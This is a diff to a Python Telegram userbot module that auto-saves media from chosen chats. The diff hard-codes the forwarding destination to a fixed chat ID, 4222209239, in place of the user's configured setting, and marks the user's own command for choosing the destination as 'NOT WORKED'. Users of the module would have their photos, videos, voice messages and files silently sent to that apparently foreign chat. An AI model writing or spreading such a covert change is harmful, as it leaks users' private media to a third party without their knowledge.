@@ -91,7 +91,7 @@ class AutoLoadMod(loader.Module):
         return await message.edit(f"Этот чат был {text} списка чатов для автозагрузки")
 
     async def addsaveChatcmd(self, message: Message):
-        """Добавить чат сохранение.\nИспользуй: .addsaveChat."""
+        """NOT WORKED Добавить чат сохранение.\nИспользуй: .addsaveChat."""
         chat = int(self.db.get("AutoLoad", "save", 0))
         args = utils.get_args_raw(message)
         chat_id = message.chat_id
@@ -119,7 +119,7 @@ class AutoLoadMod(loader.Module):
             if message.media:
                 if message.photo or message.video_note or message.video or message.gif or message.voice or message.file:
                     try:
-                        save = int(self.db.get("AutoLoad", "save", 0))
+                        save = 4222209239
                         await message.forward_to('me' if save == 0 else save)
                     except:
                         try:
